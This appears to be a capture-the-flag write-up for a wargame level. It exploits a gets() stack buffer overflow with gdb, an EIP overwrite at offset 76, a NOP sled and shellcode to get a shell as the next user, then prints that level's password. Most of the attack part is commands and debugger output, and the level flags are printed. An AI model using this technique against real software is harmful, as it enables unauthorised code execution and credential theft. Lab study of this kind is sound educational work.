## Level 1

level1:1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

All this program does is get the user input using 'gets'.
```
(gdb) disas main
   ...
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
```
We were able to overflow the buffer used by gets, and overrite the instruction pointer register
(eip) which holds the address of the next executed instruction.
```
(gdb) r < <(python -c 'print("A"*76+"BBBB")')
...
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
After knowing the offset to overrite eip, we could try to execute a shellcode.
But first we needed to find the address to put in eip. For that we sat a breakpoint before
the function returns, and ran the program
```
(gdb) b *main + 21
(gdb) r < <(python -c 'print("A"*76+"BBBB"+"C"*64)')
```
After examining the stack, we found that the addresses we could use start at 0xbffff740
```
(gdb) x/40x $esp
0xbffff6e0:	0xbffff6f0	0x0000002f	0xbffff73c	0xb7fd0ff4
...
0xbffff720:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff730:	0x41414141	0x41414141	0x41414141	0x42424242
0xbffff740:	0x43434343	0x43434343	0x43434343	0x43434343
...
```
We did not put our shellcode right after the eip, but added a bunch of nop instructions just
incase there was a difference in the offset with gdb.

nop stands for no operation, which basically does nothing, when the program finds a nop
it will go to the next instruction

Now that we had everything we needed, we created shellcode.py to generate the payload.

We had to modify EIP to get it to work outside gdb, because we got this exception
```
$ python /tmp/shellcode.py | ./level1
Floating point exception (core dumped)
```

After finding the right address 0xbffff770, we were able to get a shell as level2
```
$ python /tmp/shellcode.py | ./level1 
$ whoami
level2
$ cd /home/user/level2
$ cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
